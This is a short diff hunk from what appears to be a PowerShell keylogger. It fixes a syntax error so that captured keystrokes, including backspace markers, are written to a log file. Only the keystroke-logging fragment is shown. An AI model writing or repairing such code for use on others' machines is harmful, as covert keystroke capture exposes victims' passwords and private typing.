@@ -92,7 +92,7 @@ try {
 				if ($BackSpaceKey) {$LogOutput += '[Backspace]'}
 
 				if ($unicode_res -gt 0) {
-					$WriteFileStream($LogOutput)
+					WriteFileStream($LogOutput)
                 }
 				
             }
